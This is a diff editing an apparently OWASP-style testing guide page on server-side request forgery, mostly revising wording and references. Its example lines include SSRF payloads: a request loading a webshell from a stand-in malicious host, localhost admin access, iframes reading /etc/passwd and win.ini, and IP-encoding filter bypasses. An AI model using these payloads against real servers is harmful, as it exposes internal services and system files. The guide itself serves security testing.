@@ -6,9 +6,9 @@ Often web applications may have to interact with internal or external resources 
 
 ## Test Objectives
 
-- Identify injection points (External resource calls, API calls)
-- Test if the SSRF is exploitable
-- Asses the severity of the vulnerability
+- Identify SSRF injection points.
+- Test if the injection points are exploitable.
+- Asses the severity of the vulnerability.
 
 ## How to Test
 
@@ -22,7 +22,7 @@ Return the content of an external resource like a webshell.
 
 `https://example.com/page?page=https://malicioussite.com/shell.php`
 
-Use the localhost/loopback interface to access content restricted to the host only. This mechanism implies that if you have access to the host then you have enough privileges to directly access the `admin` page.
+Use the loopback interface to access content restricted to the host only. This mechanism implies that if you have access to the host then you have enough privileges to directly access the `admin` page.
 These kind of trust relationships, where requests originating from the local machine are handled differently than ordinary requests, are often what makes SSRF into a critical vulnerability.
 
 `https://example.com/page?page=http://localhost/admin`
@@ -46,16 +46,19 @@ There are some cases where server converts uploaded file to a pdf.Try injecting 
 
 ```html
 <iframe src="file:///etc/passwd" width="400" height="400">
-<iframe src="file:///c:/windows/win.ini" width="400" height=”400">
+<iframe src="file:///c:/windows/win.ini" width="400" height="400">
 ```
 
 ### Common Filter Bypass
 
 Some applications block references to `localhost` and `127.0.0.1`, this can be circumvented by:
 
-- Using alternative IP representation such as such as 2130706433, 017700000001, or 127.1 which evaluate to 127.0.0.1
+- Using alternative IP representation such as the below examples that evaluate to `127.0.01`:
+  - Decimal notation: `2130706433`
+  - Octal notation: `017700000001`
+  - IP shortening: `127.1`
 - String obfuscation
-- Registering your own domain that resolves to 127.0.0.1
+- Registering your own domain that resolves to `127.0.0.1`
 
 Sometimes the application allows input that matches a certain expression, like a domain. That can be circumvented if the URL schema parser is not properly implemented.
 
@@ -65,23 +68,20 @@ Sometimes the application allows input that matches a certain expression, like a
 - Fuzzing
 - Combinations of all of the above
 
-You can find more payloads [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery).
+For additional payloads and bypass techniques, check the [references](#references) section.
 
 ## Remediation
 
-Some of the main mitigation techniques include implementing IP filtering and URL filtering. You can find out more on the
-[OWASP Server Side Request Forgery Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).
-
-## Tools
-
-- Burpsuite
-- ZAP
+SSRF is known to be one of the hardest attacks to block or stop without the use of allow lists that require specific IPs and URLs to be allowed. For more on SSRF prevention, check out the [Server Side Request Forgery Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).
 
 ## References
 
-- [SSRF Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
+- [swisskyrepo: SSRF Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
 - [Reading Internal Files Using SSRF Vulnerability](https://medium.com/@neerajedwards/reading-internal-files-using-ssrf-vulnerability-703c5706eefb)
 - [Abusing the AWS Metadata Service Using SSRF Vulnerabilities](https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/)
 - [OWASP Server Side Request Forgery Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
-- [SSRF](https://portswigger.net/web-security/ssrf)
-- [Blind SSRF](https://portswigger.net/web-security/ssrf/blind)
+- [Portswigger: SSRF](https://portswigger.net/web-security/ssrf)
+- [Portswigger: Blind SSRF](https://portswigger.net/web-security/ssrf/blind)
+- [Bugcrowd Webinar: SSRF](https://www.bugcrowd.com/resources/webinars/server-side-request-forgery/)
+- [Hackerone Blog: SSRF](https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF)
+- [Hacker101: SSRF](https://www.hacker101.com/sessions/ssrf.html)
